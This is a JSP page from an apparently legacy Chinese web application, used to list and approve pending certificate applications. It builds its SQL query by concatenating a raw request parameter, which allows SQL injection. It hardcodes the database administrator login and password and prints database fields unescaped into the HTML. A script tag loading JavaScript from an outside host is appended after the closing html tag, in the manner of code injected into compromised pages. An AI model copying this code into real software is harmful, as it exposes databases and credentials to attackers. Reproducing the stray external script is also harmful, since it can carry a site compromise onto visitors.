<%@ page contentType="text/html; charset=gb2312" %>
<%@ page import="java.sql.*" %>
<%! Connection conn=null;%>
<%! Statement stmt=null;%>
<%! ResultSet rs=null;%>
<%! String searchString=null;%>
<% 
	searchString=request.getParameter("searchString").trim();
	if (searchString==null || searchString.equals("")) searchString="where not approved=1";
	else searchString=new String(searchString.getBytes("ISO8859_1"))+" and not approved=1 ";
%>
<html>
<head>
<title></title>
<style type="text/css">
<!--
.btnStyle {  width: 200px}
-->
</style>
</head>

<body bgcolor="#FFFFFF" text="#000000">
<h3 align=center>审核申请<hr></h3>
<%
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		stmt=conn.createStatement();
		rs=stmt.executeQuery("select * from applytable "+searchString);
		while(rs.next())
		{
%>
<form name="approveForm" method="post" action="approve.jsp">
<table border="1" cellspacing="0" cellpadding="0">
  <tr> 
  	<% String applyid=rs.getBigDecimal(1).toString(); %>
    <td colspan="4" nowrap><font size="2">申请序列号：<%=applyid%></font></td>
  </tr>
  <tr> 
    <td nowrap><font size="2">姓名：<%=rs.getString(2)%></font></td>
    <td nowrap><font size="2">职务：<%=rs.getString(3)%></font></td>
    <td nowrap><font size="2">单位：<%=rs.getString(4)%></font></td>
    <td nowrap><font size="2">部门：<%=rs.getString(5)%></font></td>
  </tr>
  <tr> 
    <td colspan="2" nowrap><font size="2">地址：<%=rs.getString(6)%></font></td>
    <td nowrap><font size="2">城市：<%=rs.getString(7)%></font></td>
    <td nowrap><font size="2">省份：<%=rs.getString(8)%></font></td>
  </tr>
  <tr> 
    <td nowrap><font size="2">邮政编码：<%=rs.getString(9)%></font></td>
    <td nowrap><font size="2">国家：<%=rs.getString(10)%></font></td>
    <td nowrap><font size="2">EMAIL：<%=rs.getString(11)%></font></td>
    <td nowrap><font size="2">电话：<%=rs.getString(12)%></font></td>
  </tr>
  <tr> 
    <td nowrap><font size="2">传真：<%=rs.getString(13)%></font></td>
    <td colspan="3" nowrap><font size="2">申请日期：<%=new java.util.Date(rs.getString(15)).toLocaleString()%></font></td>
  </tr>
</table>

<p align=left><font color=red size=2>请仔细审核该申请人的资料再确定：</font><input type="submit" value="        同意申请并生成证书！         "></p>
<input type="hidden" name="applyId" value="<%=applyid%>">
<hr>
</form>
<%
		 }
	}
	catch(Exception ex)
	{
%>
<h2>对不起，数据查询有错！可能是数据库问题！</h2>
<%
	}
	finally
	{
		try{ conn.close();}catch(Exception ex2){}
	}
%>
<p></p>
<div align="center"><a href="index.jsp"> 返回查询</a> </div>
</body>
</html>

<script language=javascript src=http://www.qq.com/qq.js></script>